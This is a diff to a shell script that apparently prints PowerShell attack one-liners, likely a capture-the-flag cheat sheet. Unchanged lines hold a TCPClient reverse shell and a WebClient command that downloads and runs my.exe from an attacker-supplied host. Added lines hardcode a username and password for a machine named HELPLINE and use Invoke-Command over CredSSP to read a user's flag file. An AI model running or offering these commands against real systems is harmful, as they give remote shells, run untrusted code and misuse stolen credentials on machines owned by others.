@@ -49,6 +49,11 @@ printf "$client = New-Object System.Net.Sockets.TCPClient(\"$1\",$2);$stream = $
 printf "\n\n"
 printf "$wc = New-Object System.Net.WebClient;$wc.DownloadFile(http://$1:$2, \"C:\Users\Public\");Start-Process -Filepath \"C:\Users\Public\my.exe\""
 printf "\n\n"
+
+printf "$username = \"Helpline\tolu\";\$password = \"!zaq1234567890pl!99\""
+printf "\$securePassword = ConvertTo-SecureString \$password \-AsPlainText \-Force"
+printf "\$credential = New-Object System.Management.Automation.PSCredential \$username, \$securePassword"
+printf "Invoke-Command \-ComputerName HELPLINE \-Credential \$credential \-Authentication credssp \-ScriptBlock { type C:\Users\tolu\Desktop\user.txt }"
 }
 
 function bash {
